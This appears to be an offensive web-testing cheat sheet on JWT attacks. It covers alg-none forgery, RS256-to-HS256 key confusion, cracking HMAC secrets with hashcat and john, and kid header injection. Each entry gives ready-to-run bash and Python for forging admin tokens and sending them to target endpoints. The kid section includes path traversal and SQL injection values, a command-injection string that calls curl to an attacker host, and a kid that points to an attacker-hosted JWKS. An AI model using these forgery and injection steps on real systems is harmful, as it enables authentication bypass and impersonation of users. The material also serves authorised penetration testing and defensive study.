# Web – JWT Token Attacks

### JWT None Algorithm Attack [added: 2026-04]
- **Tags:** #JWT #NoneAlgorithm #AuthBypass #AlgorithmNone #OWASPA2 #OWASPA7 #jwt_tool #TokenForge #BrokenAuth
- **Trigger:** Application uses JWT for authentication — decoded token header shows `"alg": "HS256"` or `"alg": "RS256"`. Attempt to set algorithm to `"none"` and strip the signature to see if the server accepts it
- **Prereq:** Application uses JWT tokens for session/auth + the server does not enforce algorithm verification (accepts `alg: none`) + you can decode and modify the token
- **Yields:** Complete authentication bypass — forge tokens for any user including admin without knowing the secret key. Arbitrary claim modification (role escalation, user impersonation)
- **Opsec:** Low
- **Context:** The `none` algorithm means "this token is already verified, no signature needed." Poorly implemented JWT libraries accept `alg: none` even when the server is configured for HS256/RS256. This is one of the first things to test when you see JWT tokens. The signature section should be empty (but keep the trailing dot). Try multiple capitalization variants as some libraries are case-sensitive in their bypass checks.
- **Payload/Method:**
```bash
# Step 1: Decode the existing JWT to understand its structure
# JWT format: header.payload.signature (base64url encoded, dot-separated)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYXBpX3VzZXIifQ.SIGNATURE"
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null  # Header
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null  # Payload

# Step 2: Forge a none-algorithm token manually
# New header: {"alg":"none","typ":"JWT"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
# Modified payload (escalate to admin):
PAYLOAD=$(echo -n '{"user":"admin","role":"administrator"}' | base64 | tr -d '=' | tr '+/' '-_')
# Token with empty signature (keep the trailing dot!):
FORGED="${HEADER}.${PAYLOAD}."
echo "Forged token: ${FORGED}"

# Step 3: Test the forged token
curl -s "http://target/api/admin" -H "Authorization: Bearer ${FORGED}"

# Step 4: Try capitalization variants (bypass case-sensitive checks)
# "none", "None", "NONE", "nOnE"
for alg in none None NONE nOnE NoNe; do
  HEADER=$(echo -n "{\"alg\":\"${alg}\",\"typ\":\"JWT\"}" | base64 | tr -d '=' | tr '+/' '-_')
  FORGED="${HEADER}.${PAYLOAD}."
  echo "Testing alg=${alg}:"
  curl -s -o /dev/null -w "%{http_code}" "http://target/api/admin" -H "Authorization: Bearer ${FORGED}"
  echo ""
done

# Step 5: Automated with jwt_tool
jwt_tool "$TOKEN" -X a  # Runs "alg: none" attack automatically
jwt_tool "$TOKEN" -T -S n -pc "role" -pv "admin"  # Tamper + none signing

# Step 6: Also try with algorithm as empty string or removed entirely
HEADER=$(echo -n '{"typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}."
curl -s "http://target/api/admin" -H "Authorization: Bearer ${FORGED}"
```

### JWT Algorithm Confusion HS256 / RS256 [added: 2026-04]
- **Tags:** #JWT #AlgorithmConfusion #HS256 #RS256 #KeyConfusion #PublicKey #OWASPA2 #jwt_tool #TokenForge #AsymmetricToSymmetric
- **Trigger:** Application uses RS256 (asymmetric RSA) for JWT signing and the public key is obtainable (from JWKS endpoint, TLS certificate, `.well-known/jwks.json`, or exposed config files). The server may accept HS256 (symmetric HMAC) tokens signed with the public key as the HMAC secret
- **Prereq:** RS256 JWT token in use + obtainable RSA public key (JWKS endpoint, certificate, or config leak) + server does not enforce the algorithm and accepts HS256 when configured for RS256
- **Yields:** Token forgery for any user — sign arbitrary claims using the public key as an HMAC secret, bypassing the intended RSA signature verification entirely
- **Opsec:** Low
- **Context:** When a server is configured for RS256, it verifies tokens using the RSA public key. If you change the algorithm to HS256, a vulnerable library will use that same public key as the HMAC secret for symmetric verification. Since the public key is public, you can sign any payload. This is one of the most critical JWT vulnerabilities and requires obtaining the public key first.
- **Payload/Method:**
```bash
# Step 1: Obtain the public key
# From JWKS endpoint:
curl -s "http://target/.well-known/jwks.json" | python3 -m json.tool
# From OpenID configuration:
curl -s "http://target/.well-known/openid-configuration" | python3 -c "import sys,json; print(json.load(sys.stdin)['jwks_uri'])"
# Convert JWKS to PEM:
# Use jwt_tool or python:
python3 -c "
from jwcrypto import jwk
import json, sys
jwks = json.loads(open('jwks.json').read())
key = jwk.JWK(**jwks['keys'][0])
print(key.export_to_pem())
" > public.pem

# From TLS certificate:
openssl s_client -connect target:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

# Step 2: Forge token with HS256 using the public key as HMAC secret
# Using jwt_tool:
jwt_tool "$TOKEN" -X k -pk public.pem
# -X k = key confusion attack, uses the public key as HMAC secret

# Step 3: Manual forge with Python
python3 << 'PYEOF'
import jwt
import json

# Read the public key (PEM format)
with open('public.pem', 'r') as f:
    public_key = f.read()

# Forge payload
payload = {
    "user": "admin",
    "role": "administrator",
    "iat": 1700000000,
    "exp": 1900000000
}

# Sign with HS256 using the public key as the secret
# NOTE: requires PyJWT < 2.4.0, or use jwt_tool instead (newer PyJWT blocks this)
forged = jwt.encode(payload, public_key, algorithm='HS256')
print(f"Forged token: {forged}")
PYEOF

# Step 4: Test the forged token
curl -s "http://target/api/admin" -H "Authorization: Bearer ${FORGED_TOKEN}"

# Step 5: If public key is in JWKS format (n, e parameters), convert first
python3 << 'PYEOF'
from Crypto.PublicKey import RSA
import base64, struct

# From JWKS: {"kty":"RSA","n":"...","e":"AQAB"}
n_b64 = "PASTE_N_VALUE_HERE"
e_b64 = "AQAB"

def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

n = int.from_bytes(b64url_decode(n_b64), 'big')
e = int.from_bytes(b64url_decode(e_b64), 'big')
key = RSA.construct((n, e))
print(key.export_key().decode())
PYEOF

# Step 6: jwt_tool full pipeline
jwt_tool "$TOKEN" -X k -pk public.pem -T -pc "user" -pv "admin" -pc "role" -pv "administrator"
```

### JWT Secret Brute Force [added: 2026-04]
- **Tags:** #JWT #BruteForce #SecretCrack #hashcat #jwt_tool #HS256 #WeakSecret #OWASPA2 #PasswordCracking #16500
- **Trigger:** Application uses HS256/HS384/HS512 (HMAC-based) JWT signing — the secret key may be weak, default, or dictionary-based. Token is obtainable from authentication responses, cookies, or local storage
- **Prereq:** A valid JWT token signed with HMAC (HS256/HS384/HS512) + wordlist of potential secrets + hashcat or jwt_tool installed
- **Yields:** The HMAC signing secret — once known, you can forge tokens for any user with any claims, achieving complete authentication bypass
- **Opsec:** Low
- **Context:** Many applications use weak or default JWT secrets like "secret", "password", company name, or short strings. Cracking HS256 is computationally cheap with hashcat (GPU-accelerated). Once you have the secret, you can sign any token you want. Always attempt this when you see HMAC-based JWT tokens — it takes seconds to try common secrets and minutes for a full wordlist.
- **Payload/Method:**
```bash
# Step 1: Extract the JWT token
# From cookie:
TOKEN=$(curl -s -c - "http://target/login" -d "user=test&pass=test" | grep -oP 'jwt=\K[^ ;]+')
# From response body:
TOKEN=$(curl -s "http://target/api/login" -d '{"username":"test","password":"test"}' -H "Content-Type: application/json" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
# From browser: check localStorage, sessionStorage, or cookies in DevTools

# Step 2: Verify it's HMAC-based
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
# Should show: {"alg":"HS256",...}

# Step 3: Crack with hashcat (GPU-accelerated, fastest method)
echo "$TOKEN" > jwt.txt
# Mode 16500 = JWT
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
# With rules for mutations:
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Step 4: Quick check of common/default secrets first
cat > jwt_common_secrets.txt << 'SECRETEOF'
secret
password
123456
jwt_secret
changeme
key
mysecret
admin
test
default
supersecret
your-256-bit-secret
AllYourBase
SECRETEOF
hashcat -m 16500 jwt.txt jwt_common_secrets.txt --force

# Step 5: Crack with jwt_tool (CPU-based, slower but convenient)
jwt_tool "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
# -C = crack mode, -d = dictionary

# Step 6: Crack with john the ripper
echo "$TOKEN" > jwt_john.txt
john jwt_john.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Step 7: Once cracked, forge a new token
SECRET="cracked_secret_here"
jwt_tool "$TOKEN" -T -S hs256 -p "$SECRET" -pc "user" -pv "admin" -pc "role" -pv "administrator"

# Or with Python:
python3 -c "
import jwt
token = jwt.encode({'user':'admin','role':'administrator','exp':1900000000}, '${SECRET}', algorithm='HS256')
print(token)
"

# Step 8: Use the forged token
curl -s "http://target/api/admin/users" -H "Authorization: Bearer ${FORGED}"
```

### JWT kid Header Injection [added: 2026-04]
- **Tags:** #JWT #kidInjection #HeaderInjection #PathTraversal #SQLi #OWASPA2 #KeyID #DirectoryTraversal #CommandInjection
- **Trigger:** JWT token header contains a `kid` (Key ID) parameter — this value is often used server-side to look up the signing key from a file path, database query, or URL. If unsanitized, it's injectable
- **Prereq:** JWT token with `kid` header parameter + the server uses `kid` in a file path, database query, or command to retrieve the signing key + no input validation on `kid`
- **Yields:** Token forgery — by controlling which key the server uses for verification, you can sign tokens with a known value (empty string from /dev/null, known file content, or SQL-injected key value)
- **Opsec:** Low
- **Context:** The `kid` parameter tells the server which key to use for signature verification. If the server reads a file based on `kid`, path traversal lets you point it at `/dev/null` (empty key) or any file with known content. If `kid` is used in a SQL query, you can inject to return a key value you control. This is a powerful but underexplored JWT attack vector.
- **Payload/Method:**
```bash
# Step 1: Check if the JWT has a kid parameter
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
# Look for: {"alg":"HS256","kid":"key1","typ":"JWT"}

# Step 2: Path traversal to /dev/null (sign with empty string)
# If kid is used as a file path: key = read_file(kid)
# /dev/null returns empty content → sign with empty string ""
jwt_tool "$TOKEN" -X i -I -hc kid -hv "../../../../../../dev/null" -S hs256 -pc "user" -pv "admin" -p ""
# -X i = inject kid, -p "" = sign with empty string as secret

# Step 3: Manual forge with kid pointing to /dev/null
python3 << 'PYEOF'
import jwt
import base64

# Header with kid traversal
token = jwt.encode(
    {"user": "admin", "role": "administrator", "exp": 1900000000},
    "",  # empty string as secret (content of /dev/null)
    algorithm="HS256",
    headers={"kid": "../../../../../../../dev/null"}
)
print(f"Forged: {token}")
PYEOF

# Step 4: Path traversal to a known public file
# If you know the content of a file on the server (e.g., /proc/sys/kernel/hostname, CSS file):
jwt_tool "$TOKEN" -X i -I -hc kid -hv "../../../../../../etc/hostname" -S hs256 -pc "user" -pv "admin" -p "$(cat /etc/hostname)"

# Step 5: SQL injection in kid (if kid is used in a DB query)
# Server code: SELECT key FROM keys WHERE kid = '$KID'
# Inject to return a known value:
KID="' UNION SELECT 'attacker_controlled_secret' -- -"
jwt_tool "$TOKEN" -X i -I -hc kid -hv "$KID" -S hs256 -pc "user" -pv "admin" -p "attacker_controlled_secret"

# Step 6: Command injection in kid (rare but devastating)
# If server executes: key=$(cat keys/$KID.pem)
KID="key1|curl ATTACKER:8080/rce"
# Or for key extraction: key1$(sleep 5) for time-based confirmation

# Step 7: JWKS injection — kid pointing to attacker's JWKS
# If kid is a URL or used to fetch from a URL:
KID="http://ATTACKER:8080/jwks.json"
# Host a JWKS with your own key pair on ATTACKER

# Step 8: Test the forged token
curl -s "http://target/api/admin" -H "Authorization: Bearer ${FORGED}"
```
